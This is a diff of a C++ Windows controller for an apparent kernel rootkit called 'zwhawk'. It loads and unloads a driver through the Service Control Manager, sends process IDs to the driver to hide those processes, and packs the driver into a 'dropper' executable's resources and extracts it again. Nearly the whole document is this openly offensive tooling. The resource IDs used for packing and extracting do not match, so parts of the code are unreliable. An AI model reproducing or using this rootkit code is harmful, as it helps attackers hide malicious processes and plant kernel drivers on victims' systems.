@@ -2,11 +2,15 @@
 #include <Windows.h>
 #include <string>
 
-BYTE read_data_file(char *driver_name){
-
+// Encapsulate in Portable Executable ( PE )
+bool encapsulation(char *dropper_name, char *driver_name){
+    HANDLE hFileSys;
+    DWORD dwFileSize, dwBytesRead;
+    LPBYTE lpBuffer;
+    HANDLE hResourceEXE;
     char aSysPath[1024];
     char aCurrentDirectory[515];
-
+    char aExePath[1024];
     /*
     Retrieves the current directory for the current process.
 
@@ -19,10 +23,7 @@ BYTE read_data_file(char *driver_name){
 
     //int _snprintf( char *buffer, size_t count, const char *format [, argument] ... );
     _snprintf(aSysPath,1022,"%s\\%s.sys",aCurrentDirectory,driver_name);
-
-    HANDLE hFile;
-    DWORD dwFileSize, dwBytesRead, dwBytesWrite;
-    LPBYTE lpBuffer;
+    _snprintf(aExePath,1022,"%s\\%s.exe",aCurrentDirectory,dropper_name);
 
     /*
     Creates or opens a file or I/O device.
@@ -38,16 +39,10 @@ BYTE read_data_file(char *driver_name){
       _In_opt_ HANDLE                hTemplateFile // A valid handle to a template file with the GENERIC_READ access right.
     );
     */
-    hFile = CreateFile(aSysPath, GENERIC_READ,
-                   0,
-                   NULL,
-                   OPEN_EXISTING,
-                   FILE_ATTRIBUTE_NORMAL,
-                   NULL);
+    hFileSys = CreateFile(aSysPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     // If CreateFile succeeded
-    if (INVALID_HANDLE_VALUE == hFile)
-    {
-        printf("read_data_file - CreateFile failed (%Iu)\n", GetLastError());
+    if (INVALID_HANDLE_VALUE == hFileSys){
+        printf("encapsulation - CreateFile failed (%Iu)\n", GetLastError());
         return false;
     }
 
@@ -59,12 +54,11 @@ BYTE read_data_file(char *driver_name){
       _Out_opt_ LPDWORD lpFileSizeHigh // A pointer to the variable where the high-order doubleword of the file size is returned.
     );
     */
-    dwFileSize = GetFileSize(hFile, NULL);
+    dwFileSize = GetFileSize(hFileSys, NULL);
     if (!(dwFileSize)){
-        printf("read_data_file - GetFileSize failed (%Iu)\n", GetLastError());
+        printf("encapsulation - GetFileSize failed (%Iu)\n", GetLastError());
         return false;
     }
-
     lpBuffer = new BYTE[dwFileSize];
 
     /*
@@ -79,33 +73,12 @@ BYTE read_data_file(char *driver_name){
       _Inout_opt_ LPOVERLAPPED lpOverlapped // A pointer to an OVERLAPPED structure.
     );
     */
-    if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) == FALSE)
-    {
-        printf("read_data_file - ReadFile failed (%Iu)\n", GetLastError());
-        CloseHandle(hFile);
+    if (!(ReadFile(hFileSys, lpBuffer, dwFileSize, &dwBytesRead, NULL))){
+        printf("encapsulation - ReadFile failed (%Iu)\n", GetLastError());
+        CloseHandle(hFileSys);
         return false;
     }
-
-    CloseHandle(hFile);
-    return lpBuffer;
-}
-
-bool encapsulation(char *driver_name, LPBYTE lpBuffer){
-}
-    HANDLE hResource1;
-    char aExePath[1024];
-    char aCurrentDirectory[515];
-
-    /*
-    Retrieves the current directory for the current process.
-
-    DWORD WINAPI GetCurrentDirectory(
-      _In_  DWORD  nBufferLength, // The length of the buffer for the current directory string, in TCHARs.
-      _Out_ LPTSTR lpBuffer // A pointer to the buffer that receives the current directory string.
-    );
-    */
-    GetCurrentDirectory( 512, aCurrentDirectory);
-    _snprintf(aExePath,1022,"%s\\%s.exe",aCurrentDirectory,driver_name);
+    CloseHandle(hFileSys);
 
     /*
     Retrieves a handle that can be used by the UpdateResource function to add, delete,
@@ -116,13 +89,11 @@ bool encapsulation(char *driver_name, LPBYTE lpBuffer){
       _In_ BOOL    bDeleteExistingResources // Indicates whether to delete the pFileName parameter's existing resources.
     );
     */
-    hResourceEXE = BeginUpdateResource(aExePath, FALSE);
-    if (NULL == hResource1)
-    {
+    hResourceEXE = BeginUpdateResource((LPCTSTR)aExePath, FALSE);
+    if (!(hResourceEXE)){
         printf("encapsulation - BeginUpdateResource failed (%Iu)\n", GetLastError());
         return false;
     }
-
     /*
     Adds, deletes, or replaces a resource in a portable executable (PE) file.
 
@@ -142,59 +113,174 @@ bool encapsulation(char *driver_name, LPBYTE lpBuffer){
        USHORT usSubLanguage // Sublanguage identifier.
     );
     );
+
+
+    Converts an integer value to a resource type compatible with the resource-management functions.
+
+    LPTSTR MAKEINTRESOURCE(
+       WORD wInteger // The integer value to be converted.
+    );
     */
-    if (UpdateResource(hResourceEXE, MAKEINTRESOURCE(10), MAKEINTRESOURCE(10), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID) lpBuffer, dwFileSize) == FALSE)
-    {
+    if (!(UpdateResource(hResourceEXE, RT_RCDATA, MAKEINTRESOURCE(104), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID) lpBuffer, dwFileSize))){
         printf("encapsulation - UpdateResource failed (%Iu)\n", GetLastError());
         return false;
     }
-    EndUpdateResource(hResourceEXE, FALSE);
+
+    /*
+    Commits or discards changes made prior to a call to UpdateResource.
+
+    BOOL WINAPI EndUpdateResource(
+      _In_ HANDLE hUpdate, // A module handle returned by the BeginUpdateResource function, and used by
+                           // UpdateResource, referencing the file to be updated.
+      _In_ BOOL   fDiscard // Indicates whether to write the resource updates to the file.
+    );
+
+    */
+    if (!(EndUpdateResource(hResourceEXE, FALSE))){
+        printf("encapsulation - EndUpdateResource failed (%Iu)\n", GetLastError());
+        return false;
+    }
+    return true;
+    }
+
+// Decapsulate in Portable Executable ( PE )
+bool decapsulation(char *dropper_name, char *driver_name){
     HMODULE hLibrary;
     HRSRC hResource;
     HGLOBAL hResourceLoaded;
-
-    hLibrary = LoadLibrary(main_file);
-    if (NULL != hLibrary)
-    {
-        hResource = FindResource(hLibrary, MAKEINTRESOURCE(10), MAKEINTRESOURCE(10));
-
-
-        if (NULL != hResource)
-        {
-`
-            hResourceLoaded = LoadResource(hLibrary, hResource);
-            if (NULL != hResourceLoaded)
-            {
-
-                lpBuffer = (LPBYTE) LockResource(hResourceLoaded);
-                if (NULL != lpBuffer)
-                {
-                }
-            }
-        }
-
-
-    }
-
-
     DWORD dwBytesWritten;
+    LPBYTE lpBuffer;
+    DWORD dwFileSize;
+    HANDLE hFileSys;
 
-    dwFileSize = SizeofResource(hLibrary, hResource);
-    hFile = CreateFile(resource_file_out,
-                       GENERIC_WRITE,
-                       0,
-                       NULL,
-                       CREATE_ALWAYS,
-                       FILE_ATTRIBUTE_NORMAL,
-                       NULL);
+    char aExePath[1024];
+    char aSysPath[1024];
 
-    if (INVALID_HANDLE_VALUE != hFile)
-    {
-        WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);
-        CloseHandle(hFile);
+    char aCurrentDirectory[515];
+
+    /*
+    Retrieves the current directory for the current process.
+
+    DWORD WINAPI GetCurrentDirectory(
+      _In_  DWORD  nBufferLength, // The length of the buffer for the current directory string, in TCHARs.
+      _Out_ LPTSTR lpBuffer // A pointer to the buffer that receives the current directory string.
+    );
+    */
+    GetCurrentDirectory( 512, aCurrentDirectory);
+    _snprintf(aExePath,1022,"%s\\%s.exe",aCurrentDirectory,dropper_name);
+    _snprintf(aSysPath,1022,"%s\\%s.sys",aCurrentDirectory,driver_name);
+
+    /*
+    Loads the specified module into the address space of the calling process.
+
+    HMODULE WINAPI LoadLibrary(
+      _In_ LPCTSTR lpFileName // The name of the module. This can be either a library module
+                              // (a .dll file) or an executable module (an .exe file).
+    );
+    */
+    hLibrary = LoadLibrary(aExePath);
+    if (!(hLibrary)){
+        printf("decapsulation - LoadLibrary failed (%Iu)\n", GetLastError());
+        return false;
+    }
+    /*
+    Determines the location of a resource with the specified type and name in the specified module.
+
+    HRSRC WINAPI FindResource(
+      _In_opt_ HMODULE hModule, // A handle to the module whose portable executable file
+                                // or an accompanying MUI file contains the resource.
+      _In_     LPCTSTR lpName, // The name of the resource.
+      _In_     LPCTSTR lpType // The resource type.
+    );
+    */
+    hResource = FindResource(hLibrary, MAKEINTRESOURCE(10), MAKEINTRESOURCE(10));
+    if (!(hResource)){
+        printf("decapsulation - FindResource failed (%Iu)\n", GetLastError());
+        return false;
+    }
+    /*
+    Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
+
+    HGLOBAL WINAPI LoadResource(
+      _In_opt_ HMODULE hModule, // A handle to the module whose executable file contains the resource.
+      _In_     HRSRC   hResInfo // A handle to the resource to be loaded.
+    );
+    */
+    hResourceLoaded = LoadResource(hLibrary, hResource);
+    if (!(hResourceLoaded)){
+        printf("decapsulation - LoadResource failed (%Iu)\n", GetLastError());
+        return false;
     }
 
-    return 0;
+    /*
+    Retrieves a pointer to the specified resource in memory.
+
+    LPVOID WINAPI LockResource(
+      _In_ HGLOBAL hResData // A handle to the resource to be accessed.
+    );
+    */
+    lpBuffer = (LPBYTE) LockResource(hResourceLoaded);
+    if (!(lpBuffer)){
+        printf("decapsulation - LockResource failed (%Iu)\n", GetLastError());
+        return false;
+    }
+
+    /*
+    Retrieves the size, in bytes, of the specified resource.
+
+    DWORD WINAPI SizeofResource(
+      _In_opt_ HMODULE hModule, // A handle to the module whose executable file contains the resource.
+      _In_     HRSRC   hResInfo // A handle to the resource.
+    );
+    */
+    dwFileSize = SizeofResource(hLibrary, hResource);
+
+    /*
+    Creates or opens a file or I/O device.
+
+    HANDLE WINAPI CreateFile(
+      _In_     LPCTSTR               lpFileName, // The name of the file or device to be created or opened.
+      _In_     DWORD                 dwDesiredAccess, // The requested access to the file or device, read, write, both or neither.
+      _In_     DWORD                 dwShareMode, // If this parameter is zero and CreateFile succeeds, the file or device
+                                                  // cannot be shared and cannot be opened again until the handle to the file or device is closed.
+      _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // A pointer to a SECURITY_ATTRIBUTES structure
+      _In_     DWORD                 dwCreationDisposition, // An action to take on a file or device that exists or does not exist.
+      _In_     DWORD                 dwFlagsAndAttributes, // The file or device attributes and flags
+      _In_opt_ HANDLE                hTemplateFile // A valid handle to a template file with the GENERIC_READ access right.
+    );
+    */
+    hFileSys = CreateFile(aSysPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (INVALID_HANDLE_VALUE == hFileSys){
+        printf("decapsulation - CreateFile failed (%Iu)\n", GetLastError());
+        return false;
+    }
+
+    /*
+    BOOL WINAPI WriteFile(
+      _In_        HANDLE       hFile, // A handle to the file or I/O device
+      _In_        LPCVOID      lpBuffer, // A pointer to the buffer containing the data to be written to the file or device
+      _In_        DWORD        nNumberOfBytesToWrite, // The number of bytes to be written to the file or device
+      _Out_opt_   LPDWORD      lpNumberOfBytesWritten, // A pointer to the variable that receives the number of bytes written
+                                                       // when using a synchronous hFile parameter
+      _Inout_opt_ LPOVERLAPPED lpOverlapped
+    );
+    */
+    if (!(WriteFile(hFileSys, lpBuffer, dwFileSize, &dwBytesWritten, NULL))){
+        printf("decapsulation - WriteFile failed (%Iu)\n", GetLastError());
+        CloseHandle(hFileSys);
+        return false;
+    }
+
+    /*
+    Closes an open object handle.
+
+    BOOL WINAPI CloseHandle(
+      _In_ HANDLE hObject // A valid handle to an open object.
+    );
+*/
+    CloseHandle(hFileSys);
+    return true;
 }
 
 // Load driver to kernel space
@@ -212,8 +298,7 @@ bool load_kernel_code_scm(char *driver_name){
     );
     */
     SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if(!sh)
-    {
+    if(!sh){
         printf("load_kernel_code_scm - OpenSCManager failed (%Iu)\n", GetLastError());
         return false;
     }
@@ -266,10 +351,8 @@ bool load_kernel_code_scm(char *driver_name){
             NULL,
             NULL);
 
-    if(!rh)
-    {
-        if (GetLastError() == ERROR_SERVICE_EXISTS)
-        {
+    if(!rh){
+        if (GetLastError() == ERROR_SERVICE_EXISTS){
             /*
             Opens an existing service.
 
@@ -287,15 +370,13 @@ bool load_kernel_code_scm(char *driver_name){
             );
             */
             rh = OpenService(sh,driver_name,SERVICE_ALL_ACCESS);
-            if(!rh)
-            {
+            if(!rh){
                 printf("load_kernel_code_scm - OpenService failed (%Iu)\n", GetLastError());
                 CloseServiceHandle(sh);
                 return false;
             }
         }
-        else
-        {
+        else{
             printf("load_kernel_code_scm - CreateService failed (%Iu)\n", GetLastError());
             CloseServiceHandle(sh);
             return false;
@@ -303,8 +384,7 @@ bool load_kernel_code_scm(char *driver_name){
     }
 
     // start the drivers
-    if(rh)
-    {
+    if(rh){
         /*
         Starts a service.
 
@@ -315,15 +395,12 @@ bool load_kernel_code_scm(char *driver_name){
                                                   // for the service as arguments.
         );
         */
-        if(0 == StartService(rh, 0, NULL))
-        {
-            if(ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
-            {
+        if(0 == StartService(rh, 0, NULL)){
+            if(ERROR_SERVICE_ALREADY_RUNNING == GetLastError()){
                 printf("load_kernel_code_scm - SERVICE_ALREADY_RUNNING");
 
             }
-            else
-            {
+            else{
                 printf("load_kernel_code_scm - StartService failed (%Iu)\n", GetLastError());
                 CloseServiceHandle(sh);
                 CloseServiceHandle(rh);
@@ -334,21 +411,18 @@ bool load_kernel_code_scm(char *driver_name){
         CloseServiceHandle(sh);
         CloseServiceHandle(rh);
     }
-
     return true;
 }
 
 // Unload driver from kernel space
 bool unload_kernel_code_scm(char *driver_name){
     SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if(!sh)
-    {
+    if(!sh){
         printf("unload_kernel_code_scm - OpenSCManager failed (%Iu)\n", GetLastError());
         return false;
     }
     SC_HANDLE rh = OpenService(sh,driver_name,SERVICE_ALL_ACCESS);
-    if(!rh)
-    {
+    if(!rh){
         printf("unload_kernel_code_scm - OpenService failed (%Iu)\n", GetLastError());
         CloseServiceHandle(sh);
         return false;
@@ -381,8 +455,7 @@ bool unload_kernel_code_scm(char *driver_name){
 
     */
     // Make sure the service is not already stopped.
-    if ( !QueryServiceStatusEx( rh, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded ) )
-    {
+    if ( !QueryServiceStatusEx( rh, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded ) ){
         printf("unload_kernel_code_scm - QueryServiceStatusEx failed (%Iu)\n", GetLastError());
         CloseServiceHandle(rh);
         CloseServiceHandle(sh);
@@ -390,8 +463,7 @@ bool unload_kernel_code_scm(char *driver_name){
 
     }
 
-    if ( ssp.dwCurrentState == SERVICE_STOPPED )
-    {
+    if ( ssp.dwCurrentState == SERVICE_STOPPED ){
         printf("unload_kernel_code_scm - Service is already stopped.\n");
         CloseServiceHandle(rh);
         CloseServiceHandle(sh);
@@ -408,8 +480,7 @@ bool unload_kernel_code_scm(char *driver_name){
       _Out_ LPSERVICE_STATUS lpServiceStatus // A pointer to a SERVICE_STATUS structure that receives the latest service status information.
     );
     */
-    if ( !ControlService(rh,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS) &ssp ) )
-    {
+    if ( !ControlService(rh,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS) &ssp ) ){
         printf( "unload_kernel_code_scm - ControlService failed (%Iu)\n", GetLastError() );
         CloseServiceHandle(rh);
         CloseServiceHandle(sh);
@@ -424,8 +495,7 @@ bool unload_kernel_code_scm(char *driver_name){
       _In_ SC_HANDLE hService
     );
     */
-    if ( !DeleteService(rh) )
-    {
+    if ( !DeleteService(rh) ){
         printf( "unload_kernel_code_scm - DeleteService failed (%Iu)\n", GetLastError() );
         CloseServiceHandle(rh);
         CloseServiceHandle(sh);
@@ -465,17 +535,17 @@ bool connect_driver(char *driver_name){
     driver = (std::string("\\\\.\\") + std::string(driver_name)).c_str();
     hFile=CreateFile(driver,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
 
-    if(hFile==INVALID_HANDLE_VALUE)
-    {
+    if(hFile==INVALID_HANDLE_VALUE){
         // DWORD WINAPI GetLastError(void);
         printf("Error: Unable to connect to the driver (%Iu)\nMake sure the driver is loaded.",GetLastError());
-        return -1;
+        return false;
     }
 
-    while(1)
-    {
-        printf("\nEnter PID: ");
+    while(true){
+        printf("\nEnter PID( 99999 for exit ): ");
         scanf("%Iu",&ProcessId);
+        if (ProcessId == 99999)
+            return true;
         /*
         BOOL WINAPI WriteFile(
           _In_        HANDLE       hFile, // A handle to the file or I/O device
@@ -486,24 +556,100 @@ bool connect_driver(char *driver_name){
           _Inout_opt_ LPOVERLAPPED lpOverlapped
         );
         */
-        if(!WriteFile(hFile,&ProcessId,sizeof(DWORD),&write,NULL))
-        {
+        if(!WriteFile(hFile,&ProcessId,sizeof(DWORD),&write,NULL)){
             printf("\nError: Unable to hide process (%Iu)\n",GetLastError());
         }
 
-        else
-        {
+        else{
             printf("\nProcess successfully hidden.\n");
         }
     }
-
-    return 0;
+    return true;
 }
 
 int main(){
-    if( !load_kernel_code_scm("zwhawk") ){
-        printf("main - load_kernel_code_scm failed (%Iu)\n", GetLastError());
-        return -1;
+    printf("               _                    _    \n");
+    printf("              | |                  | |   \n");
+    printf(" ______      _| |__   __ ___      _| | __\n");
+    printf("|_  /\\ \\ /\\ / / '_ \\ / _` \\ \\ /\\ / / |/ /\n");
+    printf(" / /  \\ V  V /| | | | (_| |\\ V  V /|   < \n");
+    printf("/___|  \\_/\\_/ |_| |_|\\__,_| \\_/\\_/ |_|\\_\\\n\n");
+
+    unsigned int option {999}; // Default option
+    char *driver_name = (char*)malloc(sizeof(char) * 128);
+    char *dropper_name = (char*)malloc(sizeof(char) * 128);
+    while(1){
+        printf("\nEnter an option:\n");
+        printf("0) Connect to driver\n");
+        printf("1) Load driver\n");
+        printf("2) Unload driver\n");
+        printf("3) Encapsulate driver to EXE\n");
+        printf("4) Decapsulate driver from EXE\n");
+        scanf("%u",&option);
+
+        if (option == 0){
+            printf("\nConnect to driver\n");
+            printf("Enter driver name:");
+            scanf("%s",driver_name);
+            if (!(connect_driver(driver_name))){
+                printf("\nmain - connect_driver failed (%Iu)\n", GetLastError());
+            }
+            else{
+                printf("\nmain - connect_driver success\n");
+            }
+        }
+
+        if (option == 1){
+            printf("\nLoad driver\n");
+            printf("Enter driver name:");
+            scanf("%s",driver_name);
+            if (!(load_kernel_code_scm(driver_name))){
+                printf("\nmain - load_kernel_code_scm failed (%Iu)\n", GetLastError());
+            }
+            else{
+                printf("\nmain - load_kernel_code_scm success\n");
+            }
+        }
+
+        if (option == 2){
+            printf("\nUnload driver\n");
+            printf("Enter driver name:");
+            scanf("%s",driver_name);
+            if (!(unload_kernel_code_scm(driver_name))){
+                printf("\nmain - unload_kernel_code_scm failed (%Iu)\n", GetLastError());
+            }
+            else{
+                printf("\nmain - unload_kernel_code_scm success\n");
+            }
+        }
+
+        if (option == 3){
+            printf("\nEncapsulate driver to EXE\n");
+            printf("Enter driver name:");
+            scanf("%s",driver_name);
+            printf("Enter dropper name:");
+            scanf("%s",dropper_name);
+            if (!(encapsulation(dropper_name, driver_name))){
+                printf("\nmain - encapsulation failed (%Iu)\n", GetLastError());
+            }
+            else{
+                printf("\nmain - encapsulation success\n");
+            }
+        }
+
+        if (option == 4){
+            printf("\nDecapsulate driver from EXE\n");
+            printf("Enter driver name:");
+            scanf("%s",driver_name);
+            printf("Enter dropper name:");
+            scanf("%s",dropper_name);
+            if (!(decapsulation(dropper_name, driver_name))){
+                printf("\nmain - decapsulation failed (%Iu)\n", GetLastError());
+            }
+            else{
+                printf("\nmain - decapsulation success\n");
+            }
+        }
+
     }
-    connect_driver("zwhawk");
 }
